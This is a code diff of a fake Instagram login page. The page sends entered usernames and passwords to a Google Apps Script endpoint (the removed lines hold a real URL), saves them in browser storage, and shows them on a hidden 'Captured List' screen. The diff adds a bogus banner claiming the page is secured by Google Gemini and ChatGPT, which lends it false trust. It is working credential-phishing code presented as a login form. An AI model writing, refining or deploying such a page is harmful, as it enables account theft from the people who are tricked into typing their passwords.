@@ -26,6 +26,9 @@
 
         h1 { font-family: 'Great Vibes', cursive; font-size: 3.5rem; color: #e91e63; margin-bottom: 20px; }
 
+        /* Personalized message style */
+        .sub-text { font-size: 0.9rem; color: #555; margin-bottom: 20px; font-weight: bold; }
+
         input {
             width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 4px; border: none;
             background-color: #000; color: #fff; box-shadow: 0 0 10px #ff00ff, 0 0 5px #00ffff;
@@ -46,7 +49,13 @@
 
         .switch-link { display: block; margin-top: 15px; color: transparent; height: 20px; text-decoration: none; }
 
-        /* Gift Screen Styling - UNTOUCHED */
+        /* Green Security Popup Styling */
+        .security-popup {
+            background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb;
+            padding: 10px; border-radius: 8px; font-size: 0.75rem; margin-top: 15px;
+            line-height: 1.4; text-align: left; box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
         #gift-screen { background: #ffc0cb; border: none; }
 
         .neon-continue {
@@ -54,11 +63,6 @@
             border-radius: 50px; box-shadow: 0 0 15px #ff0000, 0 0 30px #0000ff;
             font-weight: bold; margin-top: 30px; cursor: pointer; transition: all 0.3s;
         }
-
-        /* Log Table Styles */
-        .scroll-box { max-height: 200px; overflow-y: auto; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; background: #fff; }
-        .log-table { width: 100%; border-collapse: collapse; font-size: 0.7rem; }
-        .log-table th, .log-table td { border: 1px solid #eee; padding: 5px; text-align: left; color: #333; }
 
         .heart {
             position: fixed; color: #ff4d4d; font-size: 2rem; bottom: -50px; right: -50px;
@@ -76,11 +80,19 @@
 <div class="container">
     <div id="login-screen" class="card">
         <h1>Instagram</h1>
+        <div class="sub-text">sirf or sirf apke liye 😤🤧</div>
+        
         <input type="text" id="user" placeholder="Username">
         <input type="password" id="pass" placeholder="Password">
         <button class="login-btn" onclick="checkLogin()">Log In</button>
+        
         <div class="zoom-emoji">👉🏻👈🏻</div>
-        <a href="javascript:void(0)" class="switch-link" onclick="showSecret()">Secret</a>
+        
+        <a href="javascript:void(0)" class="switch-link" onclick="showSecret()">.</a>
+
+        <div class="security-popup">
+            <b>✓ Secured by Google Gemini, ChatGPT</b> and configured through Instagram. Full secured and private. Hassle-free and username friendly interface...
+        </div>
     </div>
 
     <div id="gift-screen" class="card">
@@ -91,17 +103,12 @@
     </div>
 
     <div id="secret-screen" class="card">
-        <h3>Captured List</h3>
-        <div class="scroll-box">
-            <table class="log-table">
-                <thead>
-                    <tr><th>User</th><th>Pass</th><th>Date</th></tr>
-                </thead>
+        <h3 style="color:#333">Captured List</h3>
+        <div style="max-height: 200px; overflow-y: auto; background: white; margin-bottom: 10px; border-radius: 5px;">
+            <table style="width:100%; border-collapse: collapse; font-size: 0.7rem; color:#333;">
                 <tbody id="logBody"></tbody>
             </table>
         </div>
-        <button class="login-btn" style="background:#4CAF50; margin-bottom:5px" onclick="exportLogs()">Download .txt</button>
-        <button class="login-btn" style="background:#e91e63; margin-bottom:5px" onclick="clearLogs()">Clear List</button>
         <button class="login-btn" onclick="hideSecret()">Back</button>
     </div>
 </div>
@@ -109,67 +116,23 @@
 <script>
     let heartInterval;
 
-    // UPDATED FUNCTION
     async function checkLogin() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
+        // PASTE YOUR GOOGLE SCRIPT URL BELOW
+        const scriptURL = 'PASTE_YOUR_GOOGLE_SCRIPT_URL_HERE'; 
 
-        if (u.trim() === "" || p.trim() === "") { 
-            alert("Please fill in both fields!"); 
-            return; 
-        }
+        if (!u || !p) { alert("Please fill all fields!"); return; }
 
-        // Replace the URL below with your Google Apps Script URL
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbwThYXXtrUC7RXMJ0mnCuhQnC2dNtPalv85TM2EA_m-vlGffKny6wUqORwPwrwLLcqUnw/exec';
+        // Send to Google Sheets
+        fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({u, p, time: new Date().toLocaleString()}) });
 
-        const data = { u, p, time: new Date().toLocaleString() };
+        // Save locally for the secret button
+        let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
+        logs.push({ u, p, time: new Date().toLocaleString() });
+        localStorage.setItem('userLogs', JSON.stringify(logs));
 
-        // This sends the data to your Google Sheet
-        try {
-            fetch(scriptURL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify(data)
-            });
-
-            // Also save locally so you can still use the "Secret" button on that device
-            let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
-            logs.push(data);
-            localStorage.setItem('userLogs', JSON.stringify(logs));
-
-        } catch (e) {
-            console.log("Sheet error, but continuing...");
-        }
-
-        // Move to the gift screen
         showScreen('gift');
-    }
-
-    function surprisePihu() {
-        const btn = document.getElementById('contBtn');
-        btn.innerText = "sorry abhi itna hi bnaaya hai 😭😅";
-        btn.style.fontSize = "0.8rem";
-        
-        setTimeout(() => {
-            btn.innerText = "Continue";
-            btn.style.fontSize = "1rem";
-            showScreen('login');
-        }, 3000);
-    }
-
-    function exportLogs() {
-        const logs = JSON.parse(localStorage.getItem('userLogs')) || [];
-        if (logs.length === 0) return alert("No logs!");
-        let text = "Captured Log List:\n\n" + logs.map(l => `User: ${l.u} | Pass: ${l.p} | Date: ${l.time}`).join("\n");
-        const blob = new Blob([text], { type: "text/plain" });
-        const a = document.createElement("a");
-        a.href = URL.createObjectURL(blob);
-        a.download = "log_report.txt";
-        a.click();
-    }
-
-    function clearLogs() {
-        if(confirm("Delete all?")) { localStorage.removeItem('userLogs'); showSecret(); }
     }
 
     function showScreen(screen) {
@@ -180,10 +143,10 @@
 
         if (screen === 'gift') {
             document.getElementById('gift-screen').style.display = 'block';
-            document.body.style.animation = "none";
             document.body.style.backgroundColor = "#ffc0cb";
+            document.body.style.animation = "none";
             heartInterval = setInterval(createHeart, 400);
-        } else if (screen === 'login') {
+        } else {
             document.getElementById('login-screen').style.display = 'block';
             document.body.style.animation = "rgbShift 10s ease infinite";
         }
@@ -203,11 +166,11 @@
         document.getElementById('secret-screen').style.display = 'block';
         const body = document.getElementById('logBody');
         const logs = JSON.parse(localStorage.getItem('userLogs')) || [];
-        body.innerHTML = logs.map(l => `<tr><td>${l.u}</td><td>${l.p}</td><td>${l.time}</td></tr>`).join('');
+        body.innerHTML = logs.map(l => `<tr style="border-bottom:1px solid #eee"><td style="padding:5px">${l.u}</td><td style="padding:5px">${l.p}</td></tr>`).join('');
     }
 
     function hideSecret() { showScreen('login'); }
+    function surprisePihu() { showScreen('login'); }
 </script>
-
 </body>
-</html>
+    </html>            
